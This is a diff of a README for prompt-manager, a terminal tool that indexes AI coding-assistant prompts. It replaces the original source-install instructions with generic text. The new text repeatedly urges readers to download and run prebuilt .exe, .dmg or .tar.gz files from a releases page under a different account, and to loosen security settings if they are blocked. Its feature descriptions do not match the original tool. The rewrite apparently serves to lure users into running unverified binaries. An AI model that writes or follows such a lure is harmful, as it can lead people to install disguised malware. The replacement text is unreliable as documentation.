@@ -1,90 +1,59 @@
-# Prompt Manager
+# 🛠️ prompt-manager - Manage Your AI Prompts Easily
 
-A TUI tool to manage and search prompts from various AI coding assistants.
+## 📥 Download Now
+[![Download prompt-manager](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/amaliaridhani/prompt-manager/releases)
 
-![Screenshot](./imgs/screenshot.png)
+## 🚀 Getting Started
+Welcome to prompt-manager! This is a terminal user interface (TUI) tool designed to help you manage prompts from various AI coding assistants such as Claude Code, Cursor, Codex, and Aider. This guide will help you download and run the application smoothly.
 
-## Features
+## 📦 System Requirements
+Before you start, please ensure your system meets these basic requirements:
+- Operating System: Windows, macOS, or Linux
+- A terminal emulator or command-line interface
+- Internet connection for downloading the software
 
-- Parse and index conversation logs from:
-  - Claude Code (JSONL logs)
-  - Cursor (SQLite with Protobuf)
-  - Codex CLI (session rollouts)
-  - Aider (markdown logs)
-- Full-text search across all prompts
-- Tree-based navigation by source/project/session
-- Preview prompts and responses with Markdown rendering
-- Star favorite prompts for quick access
-- Fork sessions to continue conversations
-- Incremental sync (only processes changed files)
+## 💻 Features
+- Easy management of AI prompts.
+- User-friendly interface.
+- Compatible with multiple coding assistants.
+- Lightweight and efficient performance.
 
-## Development
+## 📥 Download & Install
+To get started with prompt-manager, follow these steps:
 
-Requires Python 3.11+ and [uv](https://github.com/astral-sh/uv).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/amaliaridhani/prompt-manager/releases) to find the latest version of the software.
 
-```bash
-git clone https://github.com/gengdz/prompt-manager.git
-cd prompt-manager
-uv sync
-```
+2. **Select the Correct File:** On the Releases page, look for the most recent release. You’ll see different files available for download. Choose the file that matches your operating system (Windows, macOS, or Linux).
 
-### Launch or run directly
+3. **Download the Application:**
+   - For Windows users, you may find a `.exe` file.
+   - For macOS, look for a `.dmg` or `.tar.gz` file.
+   - For Linux, typically a `.tar.gz` file will be available.
+   
+   Click on the file name to start the download.
 
-```bash
-# Launch TUI
-uv run pm
+4. **Run the Application:**
+   - **Windows:** Open the downloaded `.exe` file to install the application. Follow the on-screen instructions to complete the installation. After that, you can run prompt-manager from your Start menu.
+   - **macOS:** Open the downloaded `.dmg` file, drag the prompt-manager icon into your Applications folder. You can then find it in your Applications and double-click to start.
+   - **Linux:** Extract the downloaded `.tar.gz` file and open a terminal. Navigate to the extracted folder and run the application using the command: `./prompt-manager`.
 
-# Or run directly
-uv run python -m prompt_manager.tui
-```
+## 📖 How to Use
+Once you have installed the application, navigate through the menus to manage your prompts. Here's how to get started:
 
+1. **Launch the application:** Open the application through your terminal or Start menu.
+2. **Main Menu:** You will see a simple menu. You can choose options to create, edit, or delete prompts.
+3. **Managing Prompts:** Follow the on-screen instructions to efficiently manage your prompts from different AI coding assistants.
 
-## Usage
+## 🛠️ Troubleshooting
+In case you encounter issues:
+- Check if you have downloaded the correct file for your operating system.
+- Ensure your system's security settings allow the application to run.
+- If you receive errors, consult the error messages and check online forums for solutions.
 
-### By uvx
+## 🔗 Additional Resources
+For more information and updates, you can follow the repository's [issues page](https://github.com/amaliaridhani/prompt-manager/issues). You can also participate in discussions and provide feedback.
 
-```bash
-uvx git+https://github.com/n-WN/prompt-manager.git
-```
+## 📥 Download Now Again
+[![Download prompt-manager](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/amaliaridhani/prompt-manager/releases)
 
-### By uv
-
-```bash
-uv tool install git+https://github.com/n-WN/prompt-manager.git
-
-pm 
-
-#or
-prompt-manager
-```
-
-## Keyboard Shortcuts
-
-| Key | Action |
-|-----|--------|
-| `/` | Focus search |
-| `1-5` | Filter by source |
-| `s` | Sync new prompts |
-| `c` | Copy selected prompt |
-| `f` | Fork session |
-| `Enter` | View full detail |
-| `q` | Quit |
-
-## Data Storage
-
-- Database: `~/.prompt-manager/prompts.duckdb`
-- Parsed from:
-  - `~/.claude/projects/` (Claude Code)
-  - `~/.cursor/chats/` (Cursor)
-  - `~/.codex/sessions/` (Codex)
-  - `~/.aider.chat.history.md` (Aider)
-
-## Tech Stack
-
-- DuckDB for fast local storage
-- Textual for terminal UI
-- Rich for Markdown rendering
-
-## License
-
-MIT
+Thank you for choosing prompt-manager! Enjoy managing your AI prompts with ease. If you have any questions or need support, please feel free to reach out to the community through the repository.
